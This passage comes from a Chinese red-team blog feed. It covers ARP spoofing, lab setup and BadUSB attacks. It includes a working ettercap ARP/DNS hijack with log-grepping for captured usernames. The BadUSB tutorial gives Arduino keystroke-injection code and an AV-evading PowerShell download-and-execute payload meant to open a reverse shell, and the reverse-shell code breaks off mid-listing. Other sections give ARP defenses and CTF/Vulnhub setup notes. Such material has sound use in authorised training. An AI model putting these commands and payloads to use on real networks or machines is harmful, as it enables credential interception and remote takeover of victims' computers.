class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、kali开启apache服务（kali自带）：service apache2 start</span><br><span class="line"><span class="number">2</span>、访问apache主页查看apache是否开启：浏览器输入本机地址</span><br><span class="line"><span class="number">3</span>、编辑ettercap配置文件：</span><br><span class="line"><span class="number">1</span>、进入cd /etc/ettercap</span><br><span class="line"><span class="number">2</span>、复制原有的配置文件（环境恢复比较方便）：cp etter.dns etter.dns1</span><br><span class="line"><span class="number">3</span>、设置dns劫持配置文件：vi /etc/ettercap/etter.dns 在文件最后添加以下内容</span><br><span class="line">*   A   <span class="number">192.168</span>.<span class="number">110.12</span></span><br><span class="line">*   PTR <span class="number">192.168</span>.<span class="number">110.12</span></span><br><span class="line">www.*.com  A <span class="number">192.168</span>.<span class="number">110.12</span><span class="comment">//将所有www.*.com这种的也指向192.168.110.12</span></span><br><span class="line">wq保存</span><br><span class="line">参数</span><br><span class="line">*:代表所有的网站 也可设置某个网站 www.mashibing.com</span><br><span class="line">A:代表钓鱼的ip地址</span><br><span class="line">PTR ：常被用于反向地址解析</span><br><span class="line"><span class="number">4</span>、ettercap劫持命令讲解</span><br><span class="line"> ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /被攻击者ip<span class="comment">// /被攻击者网关// </span></span><br><span class="line"> -i：网卡</span><br><span class="line"> -T：文本模式</span><br><span class="line"> -q：安静模式</span><br><span class="line"> -M：执行mitm攻击</span><br><span class="line"> -P：plugin 开始该插件</span><br><span class="line"><span class="number">5</span>、靶机访问以下网站确认是否正确</span><br><span class="line">随便访问一个 如京东</span><br><span class="line">通过ping/dns查看 查看dns是否正确</span><br><span class="line"><span class="number">6</span>、执行劫持命令</span><br><span class="line">ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /<span class="number">192.168</span>.<span class="number">110.11</span><span class="comment">// /192.168.110.1(网关IP)// &gt;&gt; b.txt</span></span><br><span class="line">进行日志实时分析：tail -f b.txt</span><br><span class="line">一个升级的实时日志分析：tail -f b.txt | grep <span class="string">&quot;USER&quot;</span></span><br><span class="line"><span class="number">7</span>、注意：对https的网站有可能是拦截不住，是有一定概率的。看访问的页面有没有安全的检测。</span><br><span class="line"><span class="number">8</span>、通过ctrl+c停止劫持。</span><br><span class="line">但是靶机的访问依然有问题，这是因为靶机的dns缓存依旧是错误的，需要ipconfig /flushdns进行依次刷新 。</span><br><span class="line"><span class="number">9</span>、回复kali环境的文件配置</span><br><span class="line">cd /etc/ettercap</span><br><span class="line">cd etter.dns etter.dns2<span class="comment">//将带攻击的保存成dns2</span></span><br><span class="line">删除攻击文件 ：rm  etter.dns</span><br><span class="line">将之前复制的那个文件进行恢复：cp etter.dns1 etter.dns<span class="comment">//将不带 攻击的dns1复制成dns</span></span><br></pre></td></tr></table></figure><h2 id="八、ARP防御方式"><a href="#八、ARP防御方式" class="headerlink" title="八、ARP防御方式"></a>八、ARP防御方式</h2><h3 id="1、ARP攻击的原理"><a href="#1、ARP攻击的原理" class="headerlink" title="1、ARP攻击的原理"></a>1、ARP攻击的原理</h3><p>ARP攻击的原理是向网关和靶机不停的发送ARP欺骗报文，而我们的计算机和网关是实时的更新ARP缓存表，从而出现安全漏洞。</p><p>防御方法：我们对这种欺骗不相信或者不接受的话，就不会有问题。</p><p>可以从两方面下手：<br>1、让我们的电脑不接受欺骗包<br>2、及时接收到欺骗的包也不要相信</p><h3 id="2、Windows防御"><a href="#2、Windows防御" class="headerlink" title="2、Windows防御"></a>2、Windows防御</h3><p>1、安装arp防火墙：如360安全卫士中的流量防火墙。可以追踪攻击者的IP和MAC地址。保护ARP表不受侵害</p><p>2、设置静态MAC地址防护</p><p>简介 ：ARP表MAC地址绑定有动态和静态两种类型。动态会实时更新，不安全；静态是长久生效，不会随时间 或者通知而变化，很安全。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、临时绑定，重启之后会失去保护效果（管理员）</span><br><span class="line">先查看网关IP和MAC地址：arp -a  | findstr <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line">再查看一下本机的网卡</span><br><span class="line"><span class="number">2</span>、查询本地连接的网卡ID号</span><br><span class="line">netsh i i show in</span><br><span class="line"><span class="number">3</span>、临时绑定mac地址，重启失效</span><br><span class="line">netsh -c i i add neighbors ID号(<span class="number">7</span>) 网关ip 网关mac地址 store=active</span><br><span class="line">neighbors：添加邻居地址</span><br><span class="line">store=active：设置为临时绑定</span><br><span class="line"><span class="number">4</span>、临时绑定，永久生效</span><br><span class="line">netsh -c i i add neighbors ID号(<span class="number">7</span>) 网关ip 网关mac地址 store=persistent</span><br><span class="line">store=persistent：永久生效</span><br><span class="line">问题：在使用命令的时候会显示对象已经存在</span><br><span class="line">而通过【arp -d <span class="number">192.168</span>.<span class="number">1.1</span>】进行的删除是不生效的，不好用</span><br><span class="line">因此用【netsh -c i i delete ne <span class="number">7</span>】这个<span class="number">7</span>是网卡ID，删除这个网卡的配置</span><br></pre></td></tr></table></figure><h3 id="3、Linux防御"><a href="#3、Linux防御" class="headerlink" title="3、Linux防御"></a>3、Linux防御</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查询arp 表命令：</span><br><span class="line">好像【arp -a】也可以用，但是Linux中不常用</span><br><span class="line">【ip n】或者用【ip neigh】进行查询</span><br><span class="line"><span class="number">2</span>、临时添加静态地址，重启后失效</span><br><span class="line">arp -s 网关ip 网关mac地址</span><br><span class="line"><span class="number">3</span>、添加静态地址，永久生效</span><br><span class="line">将下面这个添加到rc.local里边，并设置 开机自启执行</span><br><span class="line">vi  /etc/rc.local</span><br><span class="line">chmod +x /etc/rc.d/rc.local</span><br><span class="line">添加：</span><br><span class="line">arp -s <span class="number">192.168</span>.<span class="number">110.1</span> e4:<span class="number">3</span>a:<span class="number">6</span>e:<span class="number">35</span>:<span class="number">98</span>:<span class="number">00</span></span><br><span class="line">wq保存</span><br></pre></td></tr></table></figure><h3 id="4、路由-网关防护设置"><a href="#4、路由-网关防护设置" class="headerlink" title="4、路由&#x2F;网关防护设置"></a>4、路由&#x2F;网关防护设置</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、开启路由器配置网络</span><br><span class="line">一般是http:<span class="comment">//网关ip</span></span><br><span class="line"><span class="number">2</span>、在更多的局域网设置中有一个静态ip地址绑定列表</span><br><span class="line">可以对网关进行静态绑定或执行绑定。</span><br><span class="line">同时还需要对pc端进行一个绑定。</span><br><span class="line">要不然在进行ARP攻击的时候，欺骗不到路由了却能欺骗靶机，也会出问题。</span><br></pre></td></tr></table></figure><h3 id="5、Web服务器防御ARP"><a href="#5、Web服务器防御ARP" class="headerlink" title="5、Web服务器防御ARP"></a>5、Web服务器防御ARP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">web服务防御明文传输泄露用户信息的手段：使用加密协议：https</span><br><span class="line">1、什么是http</span><br><span class="line">超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于tcp/ip协议传输数据。</span><br><span class="line">2、什么是https</span><br><span class="line">https是身披ssl外壳的 http。https是一种通过计算机网络进行安全通信的传输协议，经过http进行通信，利用SSL/TLS建立全信道，加密数据包。</span><br><span class="line">使用加密传输，不容易被拦截，更加安全。</span><br><span class="line">TLS是传输层加密协议，前身是SSL协议。</span><br><span class="line">https加密通信工作原理：需要用到证书和私钥、公钥。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ARP欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】Ocean CTF 平台搭建</title>
      <link href="/2024/04/14/Extracurricular-experience-OceanCTF-System-build/"/>
      <url>/2024/04/14/Extracurricular-experience-OceanCTF-System-build/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】Ocean-CTF-平台搭建"><a href="#【其他经验】Ocean-CTF-平台搭建" class="headerlink" title="【其他经验】Ocean CTF 平台搭建"></a>【其他经验】Ocean CTF 平台搭建</h1><h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>一个动态flag练习靶场平台</p><p>具备如下多种功能：</p><ul><li>容器管理</li><li>题库管理</li><li>动态flag</li><li>作弊检测</li><li>公告通知</li><li>动态启动题库</li><li>题库隔离</li><li>公告通知</li><li>排行榜</li><li>快速部署</li><li>大屏展示</li><li>权限分离</li><li>一键部署</li><li>多端口开放</li><li>compose容器支持</li><li>fix bug</li><li>添加镜像功能页面重构</li><li>漏洞复现</li></ul><h1 id="二、预览"><a href="#二、预览" class="headerlink" title="二、预览"></a>二、预览</h1><p>线上地址 <a href="http://ctf.lostpeach.cn/">http://ctf.lostpeach.cn/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试用户: test/test</span><br></pre></td></tr></table></figure><p>管理后台 <a href="http://ctf.lostpeach.cn/manager">http://ctf.lostpeach.cn/manager</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访客管理账号 guest/guest</span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171221577.png" alt="image-20240414171221577"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171303522.png" alt="image-20240414171303522"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171208526.png" alt="image-20240414171208526"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171335032.png" alt="image-20240414171335032"></p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171538361.png" alt="image-20240414171538361"></p><h1 id="三、安装"><a href="#三、安装" class="headerlink" title="三、安装"></a>三、安装</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tongchengbin/ocean_ctf.git /opt/ocean_ctf</span><br><span class="line">cd /opt/ocean_ctf</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>初始化系统 访问 &#x2F;manager</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认账号 admin/admin</span><br></pre></td></tr></table></figure><h1 id="四、赛题"><a href="#四、赛题" class="headerlink" title="四、赛题"></a>四、赛题</h1><p>通过虚拟化-资源中心添加题目资源，题目资源可以使用本地镜像、远程镜像、如CTFDB项目中提供了默认题目可以通过同步功能拉取题库或在<a href="https://gitee.com/link?target=https://hub.docker.com/r/tongchengbin/easy_web">dockerhub</a>中查看题目</p><p>添加资源后需要进行编译（PULL）、因为编译是个比较耗时的操作(和网络环境有关)、所以建议先本地docker拉取image后点击编译按钮。 之后在CTF中添加赛事题库选择动态题目和对应的资源环境即可。</p><p>题库仓库：<a href="https://gitee.com/link?target=https://github.com/tongchengbin/ctfdb">GitHub - tongchengbin&#x2F;ctfdb: ctf 题库</a></p><h1 id="五、漏洞复现"><a href="#五、漏洞复现" class="headerlink" title="五、漏洞复现"></a>五、漏洞复现</h1><p>漏洞复现支持vulhub 部分镜像可以直接导入，但是推荐使用<a href="https://gitee.com/link?target=https://github.com/tongchengbin/ctfdb">CTFDB Vulnerability</a> 仓库进行维护,内置export脚本支持自动扫描导出漏洞文件，该文件可以在平台 漏洞复现-漏洞资源中导入</p><p><img src="/img/Extracurricular-experience-OceanCTF-System-build/image-20240414171606404.png" alt="image-20240414171606404"></p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】Vulnhub靶机扫描不到IP</title>
      <link href="/2024/04/13/Extracurricular-experience-Vulnhub-IP-correct/"/>
      <url>/2024/04/13/Extracurricular-experience-Vulnhub-IP-correct/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】Vulnhub靶机扫描不到IP"><a href="#【其他经验】Vulnhub靶机扫描不到IP" class="headerlink" title="【其他经验】Vulnhub靶机扫描不到IP"></a>【其他经验】Vulnhub靶机扫描不到IP</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>Vulnhub 靶场中部分靶机是virtual box类型的靶机，那么导入VMware中可能会出现网络配置问题，导致扫描不到靶机的IP地址</p><h3 id="二、工具"><a href="#二、工具" class="headerlink" title="二、工具"></a>二、工具</h3><p>我们使用 OVFTool_x64 工具</p><p>下载地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、在百度网盘中直接下载</span><br><span class="line">2、其他百度网盘下载链接：https://pan.baidu.com/s/1YDtHh0-OnK0Lm5C4KoF4-w</span><br></pre></td></tr></table></figure><h3 id="三、使用"><a href="#三、使用" class="headerlink" title="三、使用"></a>三、使用</h3><p>将工具解压到.ova 同目录下</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213201837478.png" alt="image-20240213201837478"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ovftool.exe Potato.ova Potato.ovf</span><br></pre></td></tr></table></figure><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213202710982.png" alt="image-20240213202710982"></p><p>然后用记事本打开 <code>Potato.ovf</code>文件，修改成你的vm版本信息。如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;vssd:VirtualSystemType&gt;vmx-17.0&lt;/vssd:VirtualSystemType&gt;</span><br></pre></td></tr></table></figure><p>保存之后，<a href="https://tool.lu/filehash/">在线网站 </a>查看该.ovf文件的SHA1 值</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213203357283.png" alt="image-20240213203357283"></p><p>复制SHA1 值并修改.mf 文件中的第一行</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213203619115.png" alt="image-20240213203619115"></p><p>保存之后，我们在VM中打开.ovf 文件即可</p><p>注意：要选择打开.ovf 文件，并且需要给新的虚拟机起一个任意的名称</p><p><img src="/img/Extracurricular-experience-Vulnhub-IP-correct/image-20240213203927498.png" alt="image-20240213203927498"></p><p>打开虚拟机之后就可以将网络连接模式改为【NAT】</p><h3 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h3><p>参考链接：<a href="https://blog.csdn.net/Mrs_H/article/details/120668701">https://blog.csdn.net/Mrs_H/article/details/120668701</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【红队近源】红队必备技能—BadUSB近源攻击</title>
      <link href="/2024/04/13/Red-Team-Invasion-BadUSB/"/>
      <url>/2024/04/13/Red-Team-Invasion-BadUSB/</url>
      
        <content type="html"><![CDATA[<h1 id="【红队近源】U盘反弹shell制作—BadUSB攻击"><a href="#【红队近源】U盘反弹shell制作—BadUSB攻击" class="headerlink" title="【红队近源】U盘反弹shell制作—BadUSB攻击"></a>【红队近源】U盘反弹shell制作—BadUSB攻击</h1><h2 id="一、工具准备"><a href="#一、工具准备" class="headerlink" title="一、工具准备"></a>一、工具准备</h2><p>1、Arduino IDE（给badusb写入代码的软件工具）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网盘已提供</span><br></pre></td></tr></table></figure><p>2、Badusb（U盘）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">374</span>)<span class="number">32</span>U4 虚拟键盘 Badusb Leomardo USB ATMEGA32U4开发板单片</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled1.png" alt="Untitled1"></p><p>3、可能出现的问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一般来说，驱动正常，在设备管理器中可以看到如下：</span><br><span class="line">如果异常，针对不同型号的badusb 可以用驱动精灵下载对应的驱动</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled2.png" alt="Untitled"></p><h2 id="二、开始编写"><a href="#二、开始编写" class="headerlink" title="二、开始编写"></a>二、开始编写</h2><ol><li><p>打开IDE ，选择板子和接口</p><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled3.png" alt="Untitled"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在Arduino <span class="number">1.5</span>.<span class="number">5</span> 版本中的设置：</span><br><span class="line"><span class="number">1</span>、在【工具】--&gt;【版】--&gt;【Arduino leonardo】</span><br><span class="line"><span class="number">2</span>、在【端口】--&gt;选择对应的端口</span><br></pre></td></tr></table></figure></li><li><p>程序介绍</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">开发版中就只有两种函数：</span><br><span class="line"><span class="title function_ invoke__">setup</span>()：就是插入badusb 之后执行的代码，执行一次。我们一般将攻击代码写入这里</span><br><span class="line"><span class="title function_ invoke__">loop</span>()：是插入后循环执行的代码。如果不写明循环条件，就会一直循环执行代码，导致不好的结果（因此一般不用这个函数）</span><br><span class="line">如：如果写入不断按F5的循环代码，可能插上后，电脑就会死机。</span><br><span class="line"></span><br><span class="line">Mouse.<span class="title function_ invoke__">begin</span>()<span class="comment">//鼠标事件开始</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">click</span>()<span class="comment">//鼠标单击</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">end</span>()<span class="comment">//鼠标事件结束</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">move</span>()<span class="comment">//鼠标移动(x,y)</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">press</span>()<span class="comment">//鼠标按下</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">release</span>()<span class="comment">//鼠标松开</span></span><br><span class="line">Mouse.<span class="title function_ invoke__">isPressed</span>()<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">KEY_LEFT_CTRL</span><br><span class="line">KEY_LEFT_SHIFT</span><br><span class="line">KEY_LEFT_ALT</span><br><span class="line">KEY_LEFT_GUI<span class="comment">//按下win键</span></span><br><span class="line">KEY_RIGHT_CTRL</span><br><span class="line">KEY_RIGHT_SHIFT</span><br><span class="line">KEY_RIGHT_ALT</span><br><span class="line">KEY_RIGHT_GUI</span><br><span class="line">KEY_UP_ARROW</span><br><span class="line">KEY_DOWN_ARROW</span><br><span class="line">KEY_LEFT_ARROW</span><br><span class="line">KEY_RIGHT_ARROW</span><br><span class="line">KEY_BACKSPACE</span><br><span class="line">KEY_TAB</span><br><span class="line">KEY_RETURN</span><br><span class="line">KEY_ESC</span><br><span class="line">KEY_INSERT</span><br><span class="line">KEY_DELETE</span><br><span class="line">KEY_PAGE_UP</span><br><span class="line">KEY_PAGE_DOWN</span><br><span class="line">KEY_HOME</span><br><span class="line">KEY_END</span><br><span class="line">KEY_CAPS_LOCK<span class="comment">//释放大写</span></span><br><span class="line">KEY_F1</span><br><span class="line">KEY_F2</span><br><span class="line">KEY_F3</span><br><span class="line">KEY_F4</span><br><span class="line">KEY_F5</span><br><span class="line">KEY_F6</span><br><span class="line">KEY_F7</span><br><span class="line">KEY_F8</span><br><span class="line">KEY_F9</span><br><span class="line">KEY_F10</span><br><span class="line">KEY_F11</span><br><span class="line">KEY_F12</span><br><span class="line"></span><br><span class="line">Keyboard.<span class="title function_ invoke__">begin</span>(); <span class="comment">// 初始化键盘库</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">2000</span>); <span class="comment">// 等待 2 秒钟（ 2000 毫秒）</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;a&#x27;</span>); <span class="comment">// 按下 &#x27;a&#x27; 键</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI); <span class="comment">// 按下左 Windows 键</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;Hello, World!&quot;</span>); <span class="comment">// 输入字符串</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_CTRL); <span class="comment">// 按下左 Ctrl 键</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_ALT); <span class="comment">// 按下左 Alt 键</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27; &#x27;</span>); <span class="comment">// 按下空格键</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();<span class="comment">// 按下回车键</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(<span class="string">&#x27;r&#x27;</span>);<span class="comment">// 释放 &#x27;a&#x27; 键，以上按键同理</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();<span class="comment">// 结束键盘模拟</span></span><br></pre></td></tr></table></figure></li><li><p>编写一个弹出浏览器打开百度（仅限keyboard.h框架下）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">setup</span>()&#123;</span><br><span class="line">Keyboard.<span class="title function_ invoke__">begin</span>(); <span class="comment">// 初始化键盘库</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">3000</span>); <span class="comment">// 等待 3 秒钟（3000毫秒）</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI); <span class="comment">// 按下左 Windows 键</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">200</span>); <span class="comment">// 等待 0.2 秒钟（200毫秒）</span></span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;r&#x27;</span>); <span class="comment">// 按下 &#x27;r&#x27; 键</span></span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">200</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">200</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;&lt;HTTP://baidu.COM&gt;&quot;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();<span class="comment">// 结束键盘模拟</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">loop</span>() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编写好代码后，就可以开始验证，有输出，无报错，就可以上传到badusb了。上传成功后，会优先执行一次代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注意：</span><br><span class="line">要是写入了攻击代码（不含loop方法），如何不被执行攻击代码？</span><br><span class="line">只需要打开记事本，插入badusb，然后鼠标不停点击记事本，代码就都写在记事本上了。</span><br></pre></td></tr></table></figure></li></ol><h2 id="三、开编反弹shell"><a href="#三、开编反弹shell" class="headerlink" title="三、开编反弹shell"></a>三、开编反弹shell</h2><ol><li><p>选用反弹工具</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">直接用cmd、nc，都会被火绒拦截</span><br><span class="line">用powershell 是比较合适的。</span><br><span class="line">payload：</span><br><span class="line">cmd /c <span class="keyword">echo</span> set-alias -name xz -value IEX;<span class="title function_ invoke__">xs</span> (New-Object \\<span class="string">&quot;NeT.WeBClient\\&quot;</span>).<span class="title function_ invoke__">downloadstring</span>(<span class="string">&#x27;&lt;http://xxxxx/xxx.ps1&gt;&#x27;</span>) | powershell</span><br><span class="line"></span><br><span class="line"><span class="comment">//下载并执行xxx.ps1脚本，这个payload 是有做混淆的，毕竟直接运行powershell 并加上攻击代码，可能会被检测。</span></span><br></pre></td></tr></table></figure></li><li><p>反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">setup</span>() &#123;</span><br><span class="line">Keyboard.<span class="title function_ invoke__">begin</span>();</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI);</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span 